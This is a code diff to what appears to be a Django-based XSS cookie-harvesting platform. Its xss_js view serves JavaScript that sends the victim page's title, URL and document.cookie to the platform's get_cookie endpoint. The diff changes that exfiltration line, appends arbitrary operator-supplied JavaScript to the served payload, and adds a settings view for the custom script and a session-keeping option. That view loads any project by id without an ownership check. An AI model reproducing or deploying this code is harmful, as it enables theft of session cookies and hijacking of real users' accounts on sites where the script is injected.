@@ -65,8 +65,10 @@ def xss_js(request):
         raise Http404
     js = """
     var x=new Image();
-    x.src=''+'%s'+'?a=info&id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
+    x.src=''+'%s'+'?id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
     """ % (BASE_URL + "get_cookie/", p.id)
+    if p.custom_js:
+        js = js + p.custom_js_content
     return HttpResponse(js)
 
 
@@ -90,5 +92,36 @@ def delete_project(request):
             except XssProject.DoesNotExist:
                 raise Http404
     return HttpResponseForbidden("Invalid Token")
+
+
+@login_required(login_url="/login/")
+def project_settings(request, project_id):
+    if request.method == "GET":
+        try:
+            p = XssProject.objects.get(pk=int(project_id))
+        except XssProject.DoesNotExist:
+            raise Http404
+        return render(request, "core/project_settings.html", {"project": p})
+    else:
+        try:
+            p = XssProject.objects.get(pk=int(project_id))
+        except XssProject.DoesNotExist:
+            raise Http404
+        checkbox_list = request.POST.getlist("settings")
+        if "custom_js" in checkbox_list:
+            p.custom_js = True
+            p.custom_js_content = request.POST.get("custom_js_content")
+            print p.custom_js_content
+        else:
+            p.custom_js = False
+        if "keep_session" in checkbox_list:
+            p.keep_session = True
+        else:
+            p.keep_session = False
+
+        p.save()
+        return HttpResponseRedirect("/project/settings/%s/" % p.id)
+
+
 
 
